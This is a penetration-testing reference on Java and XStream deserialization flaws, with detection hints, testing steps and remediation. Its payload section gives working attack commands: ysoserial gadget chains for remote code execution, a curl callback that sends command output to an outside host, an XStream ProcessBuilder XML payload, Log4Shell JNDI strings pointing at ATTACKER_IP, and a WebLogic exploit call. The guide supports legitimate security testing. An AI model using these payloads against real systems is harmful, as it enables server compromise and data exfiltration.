# XML / Java Deserialization (XStream, Java ObjectInputStream)

## Overview
Java deserialization of untrusted data is one of the most critical vulnerability classes. Java's `ObjectInputStream.readObject()` and libraries like XStream, Jackson, Kryo, and others can execute attacker-controlled code during deserialization. When a serialized Java object from an untrusted source is deserialized, gadget chains present in the classpath can lead to Remote Code Execution. This affects Java middleware (WebLogic, JBoss, Jenkins, Apache Struts) widely.

## How It Works
- Java serialized objects begin with magic bytes `AC ED 00 05` (hex) or `rO0AB` in base64.
- `ObjectInputStream.readObject()` calls the `readResolve()`, `readObject()`, and `finalize()` methods of the deserialized object.
- Attackers craft objects using gadget chains — sequences of method calls through existing classpath classes that ultimately execute arbitrary code.
- ysoserial provides pre-built gadget chains for Commons Collections, Spring, Guava, Apache Commons, Groovy, Clojure, etc.
- XStream processes XML and constructs Java objects — attackers embed Java class references in XML to trigger execution.

## Impact
- Remote Code Execution via gadget chains.
- Full server compromise.
- Affects widely used Java middleware (WebLogic CVE-2015-4852, Jenkins, Apache Struts).
- Network-accessible deserialization points (RMI, JMX, JNDI) are particularly dangerous.

## Where to Look
- HTTP request/response bodies containing `AC ED 00 05` or base64 `rO0AB`.
- Cookies and parameters with base64-encoded binary data.
- SOAP/XML API endpoints using XStream.
- Java RMI ports (1099, 1100).
- JMX ports (9010, 9999).
- WebLogic T3 protocol (7001, 7002).
- JBoss remoting (4444, 4445).
- HTTP endpoints that accept Java serialized objects (`Content-Type: application/x-java-serialized-object`).

## Testing Steps
1. Look for `AC ED 00 05` in intercepted binary requests, or base64 `rO0AB`.
2. Identify the Java framework and libraries (from server headers, error pages, classpath).
3. Download and run ysoserial to generate gadget chain payloads.
4. Test with a DNS/HTTP callback for blind OOB confirmation (use Burp Collaborator).
5. Test XStream endpoints: submit XML with `<dynamic-proxy>` or `<sorted-set>` tags.
6. For JNDI: send `${jndi:ldap://ATTACKER_IP/a}` to Log4j-vulnerable fields (Log4Shell).

## Payloads / Techniques
```bash
# Detect Java serialized object
echo "YOUR_COOKIE_VALUE" | base64 -d | xxd | head -2
# Look for: ac ed 00 05  (Java serialization magic bytes)

# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available gadget chains
java -jar ysoserial-all.jar 2>&1 | head -30

# Generate Commons Collections 6 RCE payload (ping test)
java -jar ysoserial-all.jar CommonsCollections6 "ping -c 3 COLLABORATOR.burpcollaborator.net" > payload.ser

# Generate with Spring1 gadget
java -jar ysoserial-all.jar Spring1 "curl http://COLLABORATOR.burpcollaborator.net/$(id|base64)" > payload.ser

# Base64 encode for HTTP submission
java -jar ysoserial-all.jar CommonsCollections6 "id" | base64 -w0

# XStream SSRF payload
# POST the following XML to an XStream-processing endpoint:
cat << 'EOF'
<dynamic-proxy>
  <interface>java.lang.Comparable</interface>
  <handler class="java.beans.EventHandler">
    <target class="java.lang.ProcessBuilder">
      <command><string>id</string></command>
    </target>
    <action>start</action>
  </handler>
</dynamic-proxy>
EOF

# Log4Shell test (if target uses Log4j 2.0-2.14.1)
curl -H 'X-Api-Version: ${jndi:ldap://COLLABORATOR.burpcollaborator.net/a}' \
     https://target.com/api/test
# Also try: User-Agent, X-Forwarded-For, Referer, username fields
```

```bash
# WebLogic specific (T3 protocol deserialization)
python3 weblogic_exploit.py --target https://target.com:7001 --payload CommonsCollections6 --cmd id

# Check exposed Java RMI
nmap -p 1099 target.com --script rmi-dumpregistry
```

## Burp Suite Tips
- In **Proxy**, look for binary-encoded request bodies or cookies with magic bytes.
- Use **Burp Collaborator** for OOB DNS/HTTP callbacks from ysoserial payloads.
- **Java Deserialization Scanner** (BApp Store) automates testing for Java deserialization.
- Add `AC ED 00 05` to Burp's **Interception Rules** to flag binary serialized traffic.

## Tools
- ysoserial — https://github.com/frohoff/ysoserial (gadget chain generator)
- Java Deserialization Scanner (Burp BApp)
- marshalsec — https://github.com/mbechler/marshalsec (JNDI deserialization)
- log4shell-scanner — https://github.com/fullhunt/log4j-scan

## Remediation
- Avoid deserializing Java objects from untrusted sources.
- Implement Java Serialization Filter (JEP 290): whitelist allowed classes before deserialization.
- Use safe serialization formats: JSON, Protocol Buffers, or MessagePack.
- Keep all libraries updated to remove known gadget chains.
- For XStream: use the security framework to allowlist classes: `xstream.addPermission(NoTypePermission.NONE)`.
- Deploy Java agents like SerialKiller to block dangerous classes at deserialization time.

## References
https://portswigger.net/web-security/deserialization
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
https://github.com/frohoff/ysoserial
https://www.lunasec.io/docs/blog/log4j-zero-day/ (Log4Shell)
